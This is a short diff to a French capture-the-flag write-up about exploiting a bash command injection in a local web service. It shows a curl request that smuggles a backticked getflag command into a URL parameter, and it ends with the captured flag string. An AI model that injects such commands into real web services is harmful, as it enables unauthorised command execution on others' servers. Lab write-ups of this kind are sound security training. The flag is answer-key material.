@@ -17,7 +17,7 @@ En tant que surhommes, nous connaissons bien le bash et ses defauts. L'injection
 #+begin_src bash
 curl -vvv localhost:4747'?x=`getflag`'
 #+end_src
-le flag se retrouve alors dans le contenu
+le flag se retrouve alors dans le contenu renvoye par le serveur web
 
 * FLAG :
  ne2searoevaevoem4ov4ar8ap
